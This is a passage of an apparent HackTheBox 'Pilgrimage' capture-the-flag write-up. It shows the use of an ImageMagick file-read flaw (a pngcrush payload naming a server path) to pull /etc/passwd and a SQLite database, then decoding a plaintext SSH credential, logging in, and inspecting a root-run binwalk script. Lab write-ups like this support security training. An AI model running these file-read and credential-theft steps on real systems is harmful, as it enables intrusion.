+</span></span><span class="line"><span class="cl"><span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">109</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">emily</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">emily</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">emily</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">998</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>emily</code> is a confirmed user, and the only user account created on this system. With the source code acquired from git-dumper, we know where the sqlite database is located. It is unlikely to be delivered well, but we might be able to find credentials in there. From register.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /dashboard.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;sqlite:/var/db/pilgrimage&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="nx">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="retrieving-database-file-via-imagemagick">Retrieving database file via ImageMagick</h3>
+<p>Preparing image:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Pilgrimage</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">pngcrush</span> <span class="o">-</span><span class="n">text</span> <span class="n">a</span> <span class="s2">&#34;profile&#34;</span> <span class="s2">&#34;/var/db/pilgrimage&#34;</span> <span class="n">sample</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Recompressing</span> <span class="n">IDAT</span> <span class="n">chunks</span> <span class="ow">in</span> <span class="n">sample</span><span class="o">.</span><span class="n">png</span> <span class="n">to</span> <span class="n">pngout</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Total</span> <span class="n">length</span> <span class="n">of</span> <span class="n">data</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">critical</span> <span class="n">chunks</span>            <span class="o">=</span>      <span class="mi">2206</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Best</span> <span class="n">pngcrush</span> <span class="n">method</span>        <span class="o">=</span>   <span class="mi">4</span> <span class="p">(</span><span class="n">ws</span> <span class="mi">15</span> <span class="n">fm</span> <span class="mi">0</span> <span class="n">zl</span> <span class="mi">9</span> <span class="n">zs</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span>      <span class="mi">1201</span>
+</span></span><span class="line"><span class="cl"><span class="n">CPU</span> <span class="n">time</span> <span class="n">decode</span> <span class="mf">0.001972</span><span class="p">,</span> <span class="n">encode</span> <span class="mf">0.007074</span><span class="p">,</span> <span class="n">other</span> <span class="mf">0.000923</span><span class="p">,</span> <span class="n">total</span> <span class="mf">0.011578</span> <span class="n">sec</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ identify -verbose 655a72a92d565.png 
+</span></span><span class="line"><span class="cl">Image: 655a72a92d565.png
+</span></span><span class="line"><span class="cl">  Format: PNG (Portable Network Graphics)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">   20480
+</span></span><span class="line"><span class="cl">53514c69746520666f726d61742033001000010100402020000000630000000500000000
+</span></span><span class="line"><span class="cl">000000000000000400000004000000000000000000000001000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00
+</span></span><span class="line"><span class="cl">0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As predicted, the hex is massive. Fortunately, Cyberchef still manages to just barely get the job done. And within the file, we see what looks to be a pair of credentials:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/sqlcreds.png"
+	width="726"
+	height="679"
+	srcset="/post/hackthebox-pilgrimage/Images/sqlcreds_hu1710b832adbb8aa8b51cf7a29cc5b47f_62792_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/sqlcreds_hu1710b832adbb8aa8b51cf7a29cc5b47f_62792_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="106"
+		data-flex-basis="256px"
+	
+></p>
+<p><code>emily:abigchonkyboi123</code>
+If the file is too large to translate, you can try to cut out the long sequences of 0&rsquo;s. Firstly, save into a file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ head hex.txt   
+</span></span><span class="line"><span class="cl">53514c69746520666f726d61742033001000010100402020000000630000000500000000
+</span></span><span class="line"><span class="cl">000000000000000400000004000000000000000000000001000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00
+</span></span><span class="line"><span class="cl">0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000000000000000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Use <code>sed</code> to remove lines that are full 0:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ sed &#39;s/000000000000000000000000000000000000000000000000000000000000000000000000//&#39; hex.txt | grep .
+</span></span><span class="line"><span class="cl">53514c69746520666f726d61742033001000010100402020000000630000000500000000
+</span></span><span class="line"><span class="cl">000000000000000400000004000000000000000000000001000000000000000000000000
+</span></span><span class="line"><span class="cl">000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00
+</span></span><span class="line"><span class="cl">0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">00000000000000000000000000000000000000000000000000007c030717191901815374
+</span></span><span class="line"><span class="cl">61626c65696d61676573696d6167657304435245415445205441424c4520696d61676573
+</span></span><span class="line"><span class="cl">202875726c2054455854205052494d415259204b4559204e4f54204e554c4c2c206f7269
+</span></span><span class="line"><span class="cl">67696e616c2054455854204e4f54204e554c4c2c20757365726e616d652054455854204e
+</span></span><span class="line"><span class="cl">4f54204e554c4c292b0406173f190100696e64657873716c6974655f6175746f696e6465
+</span></span><span class="line"><span class="cl">785f696d616765735f31696d616765730566010717171701812b7461626c657573657273
+</span></span><span class="line"><span class="cl">757365727302435245415445205441424c452075736572732028757365726e616d652054
+</span></span><span class="line"><span class="cl">455854205052494d415259204b4559204e4f54204e554c4c2c2070617373776f72642054
+</span></span><span class="line"><span class="cl">455854204e4f54204e554c4c29290206173d170100696e64657873716c6974655f617574
+</span></span><span class="line"><span class="cl">6f696e6465785f75736572735f3175736572730300000008000000000d000000020fdf00
+</span></span><span class="line"><span class="cl">0fe60fdf0000000000000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">00000000000000000000000000000000000000000000000502030f0f2761180103172d65
+</span></span><span class="line"><span class="cl">6d696c796162696763686f6e6b79626f693132330a000000020ff1000ff10ff700000000
+</span></span><span class="line"><span class="cl">00000000000000000000000000000000000000000000000000000000000000000005030f
+</span></span><span class="line"><span class="cl">01270208031709656d696c790d000000030f2a000fa90f690f2a00000000000000000000
+</span></span><span class="line"><span class="cl">0000000000003d030469210f687474703a2f2f70696c6772696d6167652e6874622f7368
+</span></span><span class="line"><span class="cl">72756e6b2f363535613733613237663437612e706e676474626173652e706e67273e0204
+</span></span><span class="line"><span class="cl">69230f687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f36353561
+</span></span><span class="line"><span class="cl">3732626237666237392e706e676578706c6f69742e706e672755010469510f687474703a
+</span></span><span class="line"><span class="cl">2f2f70696c6772696d6167652e6874622f736872756e6b2f363535613663356663376239
+</span></span><span class="line"><span class="cl">352e706e6753637265656e73686f745f323032332d31302d30315f31355f34375f32302e
+</span></span><span class="line"><span class="cl">706e67270a000000030f68000fce0f9b0f68000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">00000000000000000000000000000000000000000000000032036901687474703a2f2f70
+</span></span><span class="line"><span class="cl">696c6772696d6167652e6874622f736872756e6b2f363535613733613237663437612e70
+</span></span><span class="line"><span class="cl">6e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f
+</span></span><span class="line"><span class="cl">363535613732626237666237392e706e670231036909687474703a2f2f70696c6772696d
+</span></span><span class="line"><span class="cl">6167652e6874622f736872756e6b2f363535613663356663376239352e706e67
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The hex is much more manageable now, and the password is retained:</p>
+<p><img src="/post/hackthebox-pilgrimage/Images/sqlcreds2.png"
+	width="710"
+	height="764"
+	srcset="/post/hackthebox-pilgrimage/Images/sqlcreds2_hu3df16f9a3106462ff8ac69c5fd329d6a_126848_480x0_resize_box_3.png 480w, /post/hackthebox-pilgrimage/Images/sqlcreds2_hu3df16f9a3106462ff8ac69c5fd329d6a_126848_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="223px"
+	
+></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="enumeration-as-emily">Enumeration as emily</h3>
+<p>With these credentials, we can access ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ ssh emily@pilgrimage.htb                                                                           
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">emily@pilgrimage:~$ whoami
+</span></span><span class="line"><span class="cl">emily
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Emily does not have sudo privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">emily@pilgrimage:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for emily: 
+</span></span><span class="line"><span class="cl">Sorry, user emily may not run sudo on pilgrimage.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When checking running processes, we can find an interesting script named <code>malwarescan.sh</code> being run as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">emily@pilgrimage:/tmp$ ps -aux
+</span></span><span class="line"><span class="cl">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+</span></span><span class="line"><span class="cl">root           1  0.0  0.2 163784 10048 ?        Ss   02:34   0:03 /sbin/init
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">root         754  0.0  0.0   6816  2948 ?        Ss   02:35   0:00 /bin/bash /usr/sbin/malwarescan.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reading the contents:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">blacklist</span><span class="o">=(</span><span class="s2">&#34;Executable script&#34;</span> <span class="s2">&#34;Microsoft executable&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> FILE<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;/var/www/pilgrimage.htb/shrunk/</span><span class="k">$(</span>/usr/bin/echo <span class="s2">&#34;</span><span class="nv">$FILE</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/tail -n <span class="m">1</span> <span class="p">|</span> /usr/bin/sed -n -e <span class="s1">&#39;s/^.*CREATE //p&#39;</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">binout</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>/usr/local/bin/binwalk -e <span class="s2">&#34;</span><span class="nv">$filename</span><span class="s2">&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> banned in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">blacklist</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$binout</span><span class="s2">&#34;</span> <span class="o">==</span> *<span class="s2">&#34;</span><span class="nv">$banned</span><span class="s2">&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">                        /usr/bin/rm <span class="s2">&#34;</span><span class="nv">$filename</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">                <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It appears that, when files are added to the <code>/shrunk/</code> folder, this malwarescan script will run <code>binwalk -e</code>, extracting components. if there is blacklisted output, the file is removed.
+Running <code>binwalk</code> will get us the version, and we can search for vulnerabilities:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">emily@pilgrimage:~$ binwalk
